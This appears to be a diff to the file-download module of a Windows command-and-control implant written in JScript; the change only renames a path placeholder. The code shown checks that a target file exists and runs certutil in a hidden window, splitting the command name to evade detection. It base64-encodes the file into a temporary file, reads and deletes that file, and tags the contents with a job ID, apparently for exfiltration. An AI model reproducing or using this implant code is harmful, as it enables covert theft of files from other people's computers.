@@ -26,9 +26,9 @@ deleteFile = function (pathname) {
 
 try {
     fso1 = new ActiveXObject("Scripting.FileSystemObject");
-    if (fso1.FileExists("~PATH_FILE~")) {
+    if (fso1.FileExists("~REMOTE_PATHNAME~")) {
         tempout = fso1.GetSpecialFolder(2) + "\\" + uuid() + ".t" + "xt";
-        r = new ActiveXObject("WScript.Shell").Run("certut" + "il -encode " + " ~PATH_FILE~ " + tempout,0,true);
+        r = new ActiveXObject("WScript.Shell").Run("certut" + "il -encode " + " ~REMOTE_PATHNAME~ " + tempout,0,true);
         d = readFile(tempout);
         deleteFile(tempout);
         c = "~JOB_ID~" + "|" + d;
